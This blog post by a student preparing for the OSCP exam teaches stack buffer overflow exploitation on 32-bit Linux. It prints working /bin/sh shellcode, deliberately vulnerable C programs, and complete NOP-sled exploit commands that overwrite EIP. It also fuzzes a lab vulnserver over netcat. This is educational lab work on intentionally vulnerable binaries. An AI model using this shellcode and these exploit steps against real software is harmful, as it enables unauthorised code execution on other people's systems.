---
layout: post
title: The First Path to Malware Research - Buffer Overflow Analysis.
excerpt: If you follow up my latest post, you can see that it's being long time since I upload my latest post here, and you may know that I am working on and preparing to the **OSCP** exam, which is the ultimate certification in my case. One of the attacks that I have learn on that path and exciting me much, so much so that it gives me chills, is **buffer overflow** attack.
tags:
- Pentest
- Buffer Overflow
- Malware Analysis

---

If you follow up my latest post, you can see that it's being long time since I upload my latest post here, and you may know that I am working on and preparing to the **OSCP** exam, which is the ultimate certification in my case. One of the attacks that I have learn on that path and exciting me much, so much so that it gives me chills, is **buffer overflow** attack. I have seeing many attacks, from the application level to the low level, which is called also the infrastructure level, in my case I have found my self more enjoyable by learning buffer overflow, and after I finish my first attack on that low memory, I finally recognized what I really what to do on the cyber security field is to be cyber security researcher, which mean, among to the others, to know how to analysis malware and viruses, how to track their actions, and understand what they design to do, if you search about that on linkedin, you should find research type of jobs that include reverse engineering.

If you ask my Mentor, Sagi Kedmi, about that, I am sure that he will be say "you need to be the developer yourself, let the other read you garbage logs". I can say that I understand that, but after I develop my last two React-Native Apps, I was many time frustrated. On the other hand the path I have done until I have break my first program in low memory level, was so much fun and I learn a lot, so I guess that is better for me to go to that field, the malware researcher and reverse engineer.

Let's track it done, this post agenda are:
- [Understand the theoretical](#understand-the-theoretical)
- [Debugging tools and how to use them](#debugging-tools-and-how-to-use-them)
- [Performing the attack](#performing-the-attack)

## Understand the theoretical

Buffer overflow is much like other app attack, like, we enumerate the app and search for break point which can be use later to bring some reverse shell or do other thing to gain sort of access to the server side if you will. In buffer overflow is much the same, we enumerate the program in low memory and search for injection point. This is more complicated then just find the point and inject the code, but the way to find it include the two steps as in the application injection point:

1. Full Enumeration.
2. Pre-Exploit Injection.
3. Exploitation.

First let's understand in the eazy way how it work, it much like a bucket, if you have a bucket you surely know how much water you can insert to it, if you insert more than the bucket can contains, the water will flow out the bucket, and that what happens on buffer overflow. We have a memory space that contain data, and we insert more data than the **memory segment** can contain.

![bo-001.png](/assets/images/bo-001.jpg)
**Figure 1** Flow the bucket.

The problem that the buffer overflow made is not just flow out the memory segment, it flow out with new instruction which in some way make the program to execute the new instruction like they are part of the program it self, you can think of it like someone give some laboratory guide instruction to do X and Y and Z, and he does, but in some point the instruction was change by another person without the laboratory guy notice and after he have ran them he gets other reactions that he expected to see.

![bo-002.png](/assets/images/bo-002.jpg)
**Figure 2** laboratory explosion.

So, to understand it deeply, on the computer we have what called RAM (Random Access Memory), that RAM hold a portion of virtual memory (the complete **virtual memory space** includes both RAM and potentially disk space), and when some code are executable the initial data of the program are loaded into the virtual memory space, this often includes instructions, libraries, and static data.

Then the operating system maps virtual addresses used by the program to physical addresses in RAM. This mapping allows the program to interact with memory using virtual addresses, while the operating system manages the actual locations in physical memory.

The **memory segments**, are defined within the **virtual address space** of a program. Each segment is associated with a range of **virtual addresses** that the program uses to access and manage different types of data and instructions.

There is several memory segments, heap, stack, data, text and more. on our case we're going to be looking primarily at the stack segment which we going to abuse on the examples over that post.

In the case of the stack, it contains virtual addresses that represent the memory locations for function calls, local variables, and the return addresses for the program's execution flow. These virtual addresses are used by the program, and the operating system manages the mapping of these virtual addresses to actual physical addresses in RAM or on disk.

So, when a program runs, it works with virtual addresses within its various memory segments, and the operating system takes care of translating these virtual addresses to the appropriate physical addresses in the underlying hardware. This abstraction helps in efficient memory management and allows for flexibility in handling memory resources.

A virtual address is typically represented as a numerical value that serves as an identifier for a location within a program's virtual address space. The format and length of virtual addresses depend on the architecture and operating system in use. The size of a virtual address is determined by the architecture. Common sizes include 32-bit and 64-bit virtual addresses. Virtual addresses are often represented in hexadecimal for readability. For example:
- In a 32-bit system: 0x00000000 to 0xFFFFFFFF
- In a 64-bit system: 0x0000000000000000 to 0xFFFFFFFFFFFFFFFF

Just remember that each virtual addresses are used as references to locations in the program's memory, including code, data, and other segments. The stack segment in a program's virtual address space does, in a sense, point directly to the addresses that are involved in the program's execution flow. The stack is a Last In - First Out (LIFO) data structure that is used for managing function calls, local variables, and the program's execution flow.

And this is the point on our case that we must to understand, since we aim to overflow the memory, overwriting the stack and gaining control, we can manipulate it by overwriting it with a virtual address pointing to our malicious code, allowing us to execute it.

Note that the small pieces of data found in each memory segment are utilized by the CPU. These data, commonly referred to as **registers** such as EAX and EBX, serve as temporary **storage for calculations**. The CPU processes instructions from the memory segment, determining how to manipulate and operate on the stored data.

Let's break down the process of executing code step by step, simplifying the explanation.

**Loading Code:** When you run a program, the operating system loads the executable code from the disk into the computer's memory.

**Memory Segments:** The memory is divided into segments like the code segment (for executable instructions), data segment (for global variables), heap (for dynamic memory), and stack (for managing function calls and local variables).

**CPU Registers:** The CPU, the brain of the computer, has special storage locations called registers. General-purpose registers like EAX, EBX are used for quick data storage and manipulation.

**Instruction Fetch:** The CPU fetches instructions from the code segment in memory, and the program counter (a special register, the **IP** - *Instruction Pointer*) keeps track of the next instruction to be executed.

**Instruction Decode and Execute:** The CPU decodes the fetched instruction and performs the corresponding operation. This could be arithmetic, logic, or control-flow operations.

**Memory Access:** Data may be read from or written to memory during instruction execution. This involves using memory addresses.

**Registers in Action:** General-purpose registers (like EAX) store temporary data during calculations.

**Function Calls:** When a function is called, the stack is used to manage information like return addresses, local variables, and parameters.

**Return from Functions:** When a function returns, the stack is used to retrieve the return address and resume execution from that point.

**CPU Control Flow:** The CPU's control unit manages the flow of instructions, ensuring they are executed in the correct order.

**Exception Handling:** If an error occurs or a special condition arises, the CPU may trigger an exception, leading to specific actions or interrupting the normal flow.

In summary, when you run code, the CPU fetches and executes instructions stored in memory. Registers help with quick data storage, and different memory segments organize data and code. The stack is crucial for managing function calls, while the CPU's control unit oversees the flow of instructions. It's a complex dance orchestrated by the CPU to make your program run.

![bo-003.png](/assets/images/bo-003.png)
**Figure 3** The operation when code are executed.

## Debugging tools and how to use them.

If we have some program and we want to make research to analysis if we can perform buffer overflow on it, we must run some debugging tool that help us for understand how the program work and identified if we can overflow it, also after we have found that program is vulnerable, the full operation to make code the abuse the program for buffer overflow are done side by side with that debugging tool.

We can find several debugging tool, since we talk about linux, we going to check the debugging tool that fit for linux. In our case we going to use GDB (GNU Debugger), but also you can use another tools, for example, EDB, IDE Pro, Valgrind, strace, ltrace, gdbserver, perf, rr (Mozilla's Record and Replay), Various strace and ltrace GUIs (Graphical User Interfaces).

Also, you can find **Ghidra** which can help a lot on reverse some binary and understand the code, but we will talk about it on another post.

Before we going to dive into the first code, on the follows examples we going to use some shellcode, so we will create buffer overflow and run our malicious code so we should get back new shell from our execution.

The following shell code I found over exploit db, which is 13333.txt:
```
https://github.com/blackorbird/exploit-database/blob/master/shellcodes/lin_x86/13333.txt
```

First we going to compile that code and make some binary files of it, after that we will create hex values so we can use it as the malicious part on our buffer overflow.

The original code look like the following:
```
;shellcode.asm
global _start
section .text
_start:
  ;setuid(0)
  xor ebx,ebx
  lea eax,[ebx+17h]
  cdq
  int 80h
  ;execve("/bin/sh",0,0)
  xor ecx,ecx
  push ecx
  push 0x68732f6e
  push 0x69622f2f
  lea eax,[ecx+0Bh]
  mov ebx,esp
  int 80h
```

That code should be save as shellcode.asm, then we use the following code for change it's format to elf file so we can make it as binary file:
```
nasm -f elf32 -o shellcode.o shellcode.asm
```

Now, we going to links the object file "shellcode.o" into an executable binary named "shellcode" using the GNU Linker. The resulting binary is a 32-bit ELF executable that can be executed on a compatible system.
```
ld -m elf_i386 -o shellcode shellcode.o
```

We can check now it if work and give us new shell on our terminal:
![shell01.png](/assets/images/shell01.png)
**Figure 4** New shell on our terminal.

Now, we want to convert that binary to hex value so we can use it on   the buffer overflow example here. We going to use the command objcopy to extract the binary content of the *.text* section from the input file "shellcode" and saves it into a new file named "shellcode.bin". This is often done to extract the raw machine code (binary) from an executable or object file, which can be useful for various purposes such as embedding in other programs or systems.
```
bjcopy -O binary -j .text shellcode shellcode.bin
```

Now with the next command we going to convert the binary content of "shellcode.bin" into a format commonly used in shellcode or other contexts where raw hexadecimal representation is needed. The output will be a series of `\x` prefixed hexadecimal values representing each byte in the binary file.
```
xxd -p -c 1 shellcode.bin | awk '{printf("\\x%s", $1)}'\n
```

the output of that should be our hex shell code values that we need to our buffer overflow example:
```
\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80
```

Also we need to know the length of our shellcode so we can use it for our calculation:

{% highlight bash %}
#!/bin/bash

shellcode="\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80"

# Remove the escape characters and calculate the length
length=$(echo -n -e $shellcode | wc -c)

echo "Length of shellcode: $length bytes"
{% endhighlight %}

The output for that one is:`Length of shellcode: 28 bytes`.

So now we can start on our first example, let's look on our first code, the following code is the vulnerable for buffer overflow since the buffer size have no boundaries.

{% highlight c %}
#include <stdio.h>
#include <string.h>

int main(int argc, char** argv) {
    // Declare a character array 'buffer' with a size of 500 bytes
    char buffer[500];

    // Copy the string from the command line argument argv[1] into the 'buffer'
    strcpy(buffer, argv[1]);

    // Return 0, indicating successful execution
    return 0;
}
{% endhighlight %}

Let's break it down, the line `int main(int argc, char** argv)` is the declaration of the main function in a C program.

`int` this specifies that the return type of the main function is an integer. The main function typically returns an integer value to the operating system, indicating the exit status of the program. A return value of 0 usually indicates successful execution, while a non-zero value often indicates an error or abnormal termination.

`main` this is the name of the function. In C, every program must have a main function, and execution of the program starts from the main function.

`(int argc, char** argv)` these are the parameters of the main function:

`int argc` stands for "argument count" and represents the number of command-line arguments passed to the program. It includes the name of the program itself as the first argument.

`char** argv` stands for "argument vector" and is an array of strings representing the command-line arguments. Each element (argv[i]) is a string (character array) containing one of the arguments. The first argument (argv[0]) is the name of the program. Also please note that on that case we can insert even more then four arguments.

The line `char buffer[500];` declares a character array named buffer with a size of 500 bytes. The line `strcpy(buffer, argv[1]);` are used to take the user input on argv[1] and store it on the buffer that was create earlier . In the  end of the code  it return 0, which mean no output should appear on the screen.

This code are vulnerable for buffer overflow because, although there is size for the buffer, there is no checking how much data was insert on argv[1], so, if there is more then 500 characters on argv[1] it insert it to buffer which should contain only 500, which mean the pieces of data that was inserted are overwrite other field which can overwrite the instructions and take down the program or the binary file on our case.

Now, lets compile that code:
```
gcc -fno-stack-protector -z execstack -m32 -no-pie vuln1.c -o vuln1
```

This command compiles the C source file vuln1.c into a 32-bit executable named vuln1 with specific security features disabled or modified to facilitate certain types of low-level programming, security research, or exploitation scenarios.

so now, let's look on that closely, we run gdb for debug that code using:
```
>gdb ./vuln1
```
After run that code we can run `list` command for see the lines of code, please note, if the code was compile without debugging flag, we aren't be able to see the full lines of code, to run flag for debugging in `gcc` we can use `-g` on the compile process.

![bo-004.png](/assets/images/bo-004.png)
**Figure 5** List command on gdb.

If we run `disassemble main` we will be able to see the assembly version of our code, these list may seen odd to a new student on that reverse engineer field, but it not so difficult to understand, so let's break it down column after column.

![bo-005.png](/assets/images/bo-005.png)
**Figure 6** disassemble main.

On the first column we can see the odd number, `0x00001139`, this number represent the address location for the following line of code, next to it we can see `<+0>` which is indicates that the assembly instruction locate on 0 byte which mean that this is the start location of the code, you can see that this number goes up, on the third  line we can see 4, which represent that the assembly instruction is 4 bytes away from the previous instruction.

`push %ebp` is instructing the processor to push the value currently stored in the %ebp register onto the stack. The base pointer register is commonly used to point to the base of the current stack frame in function calls.

Now, let's break down the assembly code line by line for getting good understanding how it work and what the CPU have done on each.

`push %ebp`: the %ebp is register that operate by the CPU, the operator on that case is push which push %ebp to the stack, since the %ebp is the base pointer register, by doing that operation the stack should contain the EBP value.

`mov %esp, %ebp`: in that case the operator is mov, which use to move data from one location to another, the source register in our case is ESP which is the stack pointer, and the operation is moving the value on that ESP to the EBP which is the base pointer for the stack frame.

`sub $0x210, %esp`: on that case the operator are subtracts one value from another. so the value $0x210 are subtracted from %esp, which mean the stack pointer is adjusted by subtracting 528 bytes (0x210 in hexadecimal).

`mov %edi, -0x204(%ebp)`: on that case the operation is move again, so %edi, which holds the first function argument, are stored at an offset from the base pointer (0x204 are represent 516 bytes).

`mov %esi, -0x210(%ebp)`: move the %esi value to the %ebp, this is the second function argument is stored at an offset from the base pointer.

`mov -0x210(%ebp), %eax`: again, move the %ebp value to the register EAX. Which mean the second function argument is loaded into %eax.

`add $0x8, %eax`: on that line, the operation is to add one value to another, so the value $0x8 are added to EAX, which mean the value in %eax is incremented by 8.

`mov (%eax), %edx`: again, moe operator, the value pointed to by %eax is loaded into %edx.

`lea -0x200(%ebp), %eax`: The lea are stand for Load Effective Address which computes the address and loads it into a register, so the effective address is calculated and loaded into %eax.

`mov %edx, %esi`: move the value from EDX register to ESI which is used as an argument for the strcpy function.

`mov %eax, %edi`: move the holds the calculated address on EAX register to EDI which is used as an argument for the strcpy function.

`call 0x1030 <strcpy@plt>`: the operator here are performs a function call, you can see immediate value. It's the address of the strcpy function in the procedure linkage table (PLT).

`mov $0x0, %eax`: which in that case make EAX register with value of 0, meaning it reset that register.

`leave`: operator that is often used in function epilogue to restore the stack frame.

`ret`: this operator performs a function return, which mean on our case return value to the teminal, since it have no value to return (so design on the code), this operator return nothing.

## Performing the attack.

So now let's perform the attack, first we going the execute the code, we will see that it get some error.

![bo-006.png](/assets/images/bo-006.png)
**Figure 7** Segmentation fault.

We getting this error, because the function should get at least one argument, so we must insert one argument, by doing so we can see that nothing goes back, we have no output as it should be.

![bo-007.png](/assets/images/bo-007.png)
**Figure 7** Nothing back.

So now, back again to gdb, we will run command inside of that to execute the code with one argument that are far more longer then 500 characters, just remember, the code design in such way that the buffer can only contain 500 characters but there is no function ot operator that boundaries the argument1 value and there is no check what is the length of that value, and this is the case of making buffer overflow, so we going to use the command `run` with line of python code to make the argument 1 as input to that small program, we insert A char which is `\x41` on hexadecimal.

The python code I used (which is python2 in my case) make 500 of A's and insert it as an argument into the running program which is our vuln1. then after running it we should get segmentation fault.

```
└─$ gdb ./vuln1
GNU gdb (Debian 13.2-1) 13.2
Copyright (C) 2023 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./vuln1...
(gdb) run $(python2 -c 'print "\x41" * 500')
Starting program: /home/kali/Desktop/BO/binaries/vuln1 $(python2 -c 'print "\x41" * 500')
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb)
```

![bo-008.png](/assets/images/bo-008.png)
**Figure 8** Segmentation fault after insert 500 of  A's.

If we check the registers we will see that the eip register was fill up with `\x41`, so the system doesn't know how to operate with that value, so this is why we get that error, in fact on this case we overwrite the eip. we also can check the memory address to see the full vules that got in the stuck, the register esp is setup on the start of the stuck, so we can follow it and see all the characters we insert to the buffer.

To see the registers location we can run `info registers`, this will display the registers and their values and also the location address for each register.

![bo-012.png](/assets/images/bo-012.png)
**Figure 9** Registers information.

On our case ESP is point to the address `0xffffcd00`, so this is the start point we want to display the memory address table from the buffer. Since we know that the buffer size is 500, we will run the following that should display the first 500 bytes on that stack, we can use the address like as follow:

`x/500 0xffffcd00`

Or we can make it simple by run the following
```
x/500 $esp
```

Then if we scroll down, we will able to see the values of `\x41` we insert which cause the segmentation fault on the EIP. On assembly the ESP (stack pointer) are used to store the data that flow in and out the program. On our case the EIP was overwrite with `\x41` values, and we can see that list of `\x41` over the stack, so this may mean that we can store the shellcode on the stack and then create return address and overwrite the EIP with it.

The return address to the top of the stack is `0xffffcd00`, since our `A` chars are not on the top, we need to figure out what is the return address we need to use.

But first let's find the location of the EIP. We can change the inserted data in some way that we will be able to understand how much chars need to be inserted for overwrite the EIP. On our case we going to run the following:

```
run $(python2 -c "print 'A'*496 + 'B'*4")
```

On that case, we going to load 500 chars to the buffer (arg1), we load 496 chars of A's and more 4 chars of B's. Then we can see that by running that command and info registers after it, the EIP was filled up with B chars.

![bo-009.png](/assets/images/bo-009.png)
**Figure 9** Registers information after fault error.

That is mean we want to overwrite that EIP so we have control on the instruction pointer to point back to our code location, also called return address, if we have the return address that is the location of our code, this is the address we should insert to EIP.

So now we can filled the stack with our shellcode, since we know that the crash occur when the stack are filled up with 500 chars and we also know that our code is 28 bytes long and the last 4 are used for EIP overwriting, we can came up with the following:
```
run $(python2 -c "print 'A'*468+<shellcode>+'B'*4")
```

This input should make the crash again, but we now should see our shellcode inserted to the stack.
```
(gdb) run $(python2 -c "print 'A'*468+'\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80'+'B'*4")
```

then run the following to view the esp values:
```
x/500x $esp
```

![bo-010.png](/assets/images/bo-010.png)
**Figure 10** A's chars (\x41) on our stack.

You can see that the A's start between 0xffffcfd0 and 0xffffcfe0. If we want we can find the exact location of the start our A's with the following command.
```
x/4 0xffffcfd0
```

![bo-011.png](/assets/images/bo-011.jpg)
**Figure 11** Finding the exact location of our inserted data.

So, we can use the exact location of the starting code for our shell, meaning, that location address will be the return address we write over the EIP, in that way we can execute the code since the EIP is the pointer that responsible on the instruction way, so it point to some address that locate the code and execute it. But there is more option that we can do, on assembly there is NOP byte, which is `\x90` and it use as sled (slide), because if the system get such byte `\x90` it just jump to the next byte, which mean that if there is chains of `\x90` it will go to the next, and next, and next, until it will be find some code for execution.

If we chose to use that way of execution, we can use the return address that we saw earlier ( on figure 10) `0xffffcfe0`, that return address not point to the first byte of our code, instead it point to several bytes next to it, so in our case, if we use that and instead of `A` we using NOP byte, it will go next and next until it will get to our shellcode.

So the new line of code should look like the following:
```
(gdb) run $(python2 -c "print '\x90'*468+'\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80'+'\xe0\xcf\xff\xff'")
````

The last four bytes is our return address which we write done way, so the return address was: ffffcfe0. We write it backwards e0cfffff. With our shellcode we can run it and get shell directly from gdb.

![bo-013.png](/assets/images/bo-013.png)
**Figure 13** Our shell from vuln1 file on GDB.

So now it should work directly from our terminal, after several check on my machine I found that this code give me segmentation fault, since on gdb it working, I was wonder why on that case it doesn't work right.

![bo-014.png](/assets/images/bo-014.png)
**Figure 14** Again segmentation fault.

I have made some test again and came up with the following which work on the terminal directly:
```
./vuln1 $(python2 -c "print '\x90'*372+'\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80'+'\x21\xd0\xff\xff'+'C'*96")
```

![bo-015.png](/assets/images/bo-015.png)
**Figure 15** Buffer overflow for new shell.

That issue because there is a different between the terminal environment and gdb environment, there is solution that I have found [here](https://stackoverflow.com/questions/17775186/buffer-overflow-works-in-gdb-but-not-without-it) which allow to run the program on the terminal and gdb in identical way so the injection code will work, we just need use `env -i "<variables> <prog>"`.

I am not sure that this issue occur because of my kali linux, as far as I know the environment are change when I have start my gdb.

I you need to debug such issue you need to run `ulimit -c unlimited` which allow core dump, then you need to run the program again to get the error of "segmentation fault" and the run `gdb ./vuln1 core`, this allows you to analyze a core dump generated by a crashed program. A core dump is a file that captures the memory contents of a running process at the time of a crash.

So, let's summaries that, there is a path we can use to achieve our goal by manipulation the binary file it self:

**0.** Spiking - enumerate the application or program args.

**1.** Fuzzing - enumerate the program and find the point it crash.


**2.** Finding the offset - trying to find the max size for the crash point, meaning how much more data we can insert to the crash point in such way that the execution not change the stack and EIP location.

**3.** Overwrite the EIP - running `msf-pattern_create -l <number>` and find on the crash point, where the `EIP` location, we can use the `msf-pattern_offset -q <eip value>` command.

**4.** Finding the bad chars - after finding the size that can be use for the crash, find what chars are the bed chars, we can use the following command `badchars -f python`, then after crash, if the location of the `EIP` was change it's mean that there is some char that have special command, so we need to go the register and find the badchars location and remove the chars needed.

**5.** Right module - that is an step that we look at it later on, on that step if we have some of `.dll` or module the app using we will search one that not compiled with memory protection, the location of the module is important because we may use it on the EIP.

**7.** Generate shellcode - after we have done all, we can make reverse shell and use EIP to point it, the shell code can be done by using `msfvenom`, or we can use some nasm shell code and compile it in such way that we will be able to insert it to the execution for our buffer overflow.

So now let's do the same on another binary file, but now let's make it more interesting, the source code is as follow:

```
#include <stdio.h>
#include <string.h>

void convertToUppercase(char *str) {
    int length = strlen(str);

    for (int i = 0; i < length; ++i) {
        // This line introduces a vulnerability by not checking the bounds of the array
        str[i] = str[i] + ('A' - 'a');
    }
}

int main (int argc, char** argv)
{
	char inputString[500];
	strcpy(inputString, argv[1]);
	convertToUppercase(inputString);
	printf("Uppercase string: %s\n", inputString);

	return 0;
}
```

This code was compiled with the following flags:
```
gcc -fno-stack-protector -z execstack -no-pie  -m32 -o ../binaries/vuln2 ./vuln2.c
```
By running it with args, you should get the Uppercase of each char, so if your input is `a` the Uppercase should be `A`, if your input is `b`, the output should be `B` and so on.

![bo-016.png](/assets/images/bo-016.png)
**Figure 16** Output of vuln2 file.

So now we run `GDB` with that file, and test it, since the function that convert the chars to Uppercase, we need to debug the binary before the convertToUppercase function was running, but before it we can get segmentation fault by running 500 chars of `a`.

![bo-017.png](/assets/images/bo-017.png)
**Figure 17** Output of vuln2 file.

You can see and understand that I am using `a` and not `A` since we have here the **convertToUppercase** function, and since I want to see that the EIP was overwrite with bunch of `A`, I am using `a` instead.

So now we need to find the location of the EIP, in my guess it's the last 4 chars, so run 496 chars of `a` and 4 chars of `b`.

![bo-018.png](/assets/images/bo-018.png)
**Figure 18** Overwrite the EIP with `B`.

So now it's time to check the bad chars if we have such on our case, we can run the command `badchars` on our kali, or just run the following:
```
badchars -f js | sed 's/ //g' | sed 's/"//g' | sed 's/+//g' | tr -d "\n"
```

The output should be the following:

![bo-019.png](/assets/images/bo-019.png)
**Figure 19** Badchars string.

We can use that output on our debugging, but now it's time to make break point to main and then run that badchars check, so run `break main` will give us the first break point on our gdb.

![bo-020.png](/assets/images/bo-020.png)
**Figure 20** Make break point to main and check badchars.

So now we need to look on our stack and search for the location of bad chars, since I have users multiple `A` we need to find `\x41` first and then I should look for the order of the chars for bad chars.

On our case the bad chars are `\x01`, `\x09`, `\x20`, the 01 char was not dispay on the screen and the others was change to `\x00` which is not in place, that mean that these chars are used for another direction on the binary file, so we need to avoid using them on our executable code.

![bo-021.png](/assets/images/bo-021.png)
**Figure 21** Checking the badchars location.

The chars on our shell code not contain these bad chars so we still use it:
```
\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80
```

So now we need to make SLAD to our shell code, since we know that the segmentation fault occur on 500 chars long we can calculated what we need:
```
run $(python2 -c "print '\x90'*468+'\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80'+'\x62\x62\x62\x62'")
```

Please note, the `\x62` is `b`, since I want to see EIP overwrite with BBBB and since we have convertToUppercase function, I must to use lowercase `b` for that case.

![bo-022.png](/assets/images/bo-022.png)
**Figure 22** Running the code with overwrite the EIP.

Now, think about it, if we must write `\x62` for get `\x42` as the output for overwrite the EIP, it's mean that we must insert EIP address that contain value of uppercase for the address that point to our SLAD, so let's check the ESP what is that address.

![bo-023.png](/assets/images/bo-023.png)
**Figure 23** Searching for the correct address.

After we found the address that point out to out NULL chain bytes, we need to convert that to "uppercase" so we can use it on the EIP, so in my case the address is `0xffffcfe0` which mean that the EIP should be overwrite with `\xe0\xcf\xff\xff`, so by convert to we should get `\x00\xef\x1f\x1f`, but since we can't use `\x00` we need to use some other char, so give it more for byte lead as to the following `\x04\xef\x1f\x1f` which should be change by the uppercase function to `0xffffcfe4`.
```
run $(python2 -c "print '\x90'*468+'\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80'+'\x04\xef\x1f\x1f'")
```
Then BOIA!!!! we have a shell!

![bo-024.png](/assets/images/bo-024.png)
**Figure 24** Shell from GDB.

So, far we work on GDB for local buffer overflow example, I think that after we understand the way and the path we take to bring down the binary and execute shell code directly from it, we can move forwared to see how buffer overflow occur for binary that used for server side and use socket between the client to the server, in such case it's more interesting how that overflow occur.

In my case I am using vulnserver for linux, that you can find [here](https://raw.githubusercontent.com/ins1gn1a/VulnServer-Linux/master/vuln.c), first we download that c code file and compile it.

```bash
wget https://raw.githubusercontent.com/ins1gn1a/VulnServer-Linux/master/vuln.c
gcc -fno-stack-protector -z execstack -no-pie  -m32 -o ./vulnserver ./vuln.c
```

So now, we going to run that vulnserver and debug it using EDB, so we can track down the socket and understand how it manage data, also we now will view on the EDB which is another way for debugging binary file on linux.

The EDB are look like Immunity Debugger that we will use on windows for debugging binaries files like EXE, MSI and such. EDB have GUI windows that can help us while we debug the file, it contain registers info window, disassemble window, stack windows and data dump window, we will find the same on immunity debbuger later.

You should open EDB and open vulnserver file right from it.

![bo-025.png](/assets/images/bo-025.png)
**Figure 25** Select vulnserver file.

Then we need to know what command we can insert the server, after we have the all list of command we can start run the first step which is spiking, which mean to check which command are vulnerable for overflow. If the overflow will occur we should see the app crash on the server side.

![bo-026.png](/assets/images/bo-026.png)
**Figure 26** Vulnserver commands.

We can see several command, first by connecting to that target we get welcome message that tell us to run **HELP** command, by running that command we can see another two, **TIME** which use to get the time value, and **EXIT** for exit the server, in spiking step we trying to buffered each command like as follow:

HELP AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

TIME AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

EXIT AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

We can make the input to be longer with more `A`, but none of the above command work, so I cam up with the following:

HELPAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

This command crashed the app, we can use the following bash command for execute the test directly:
```bash
echo $(python2 -c "print 'HELP'+'A'*70")|nc 192.168.126.36 8080
```
![bo-027.png](/assets/images/bo-027.png)
**Figure 27** Crash the app.

Please note after each crash you should start the vulnserver directly from the EDB. After the crash we can see the register and find that the EIP was found on some value which is not `A` values.

![bo-028.png](/assets/images/bo-028.png)
**Figure 28** EIP on the point of segmentation fault.

But at the same time you can see EBP with `41` value and also the EBX, so now we going to make the query with more bytes of `A` and check if we can control the EIP and overwrite it.

```bash
echo $(python2 -c "print 'HELP'+'A'*100")|nc 192.168.126.36 8080
```

So now I am run the HELP command with bunch of `A` (100 for that case), then by checking the EDB I can see that the crash occur and the EIP was overwrite.

![bo-029.png](/assets/images/bo-029.png)
**Figure 29** Control the EIP.

So now we need to find the exect location of the EIP, for that case we need to run `msf-pattern_create` and make string of 100 chars:
```bash
└─$ msf-pattern_create -l 100            
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
```

That string should insert to our command again for crashing the app and finding the EIP location on case the input is equal 104 (100 of `A` and `HELP`). So the full command is:
```bash
echo $(python2 -c "print 'HELP'+'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A'")|nc 192.168.126.36 8080
```

![bo-030.png](/assets/images/bo-030.png)
**Figure 30** Crash with the EIP value location.

So now the value of the EIP is `33634132`, then by checking is against the command `msf-pattern_offset`, we can see what is the location of the EIP and used that location on our attack. Please remember that the overflow must be 100 chars for the overflow contain the EIP controlling.

```bash
└─$ msf-pattern_offset -l 100 -q 33634132                              
[*] Exact match at offset 68

```

So the location is 68, which mean after 68 chars we overwrite the EIP in case we insert input that in size of 100 chars. So now we need to check how much more bytes we can insert so the location of the EIP will not change.

```bash
echo $(python2 -c "print 'HELP'+'A'*68+'B'*4+'C'*32")|nc 192.168.126.36 8080
```

You can see the `B` value which is `\x42` that overwrite the EIP, which is excellent! so now we need to check how much data we can insert that the EIP will remain on the same location.
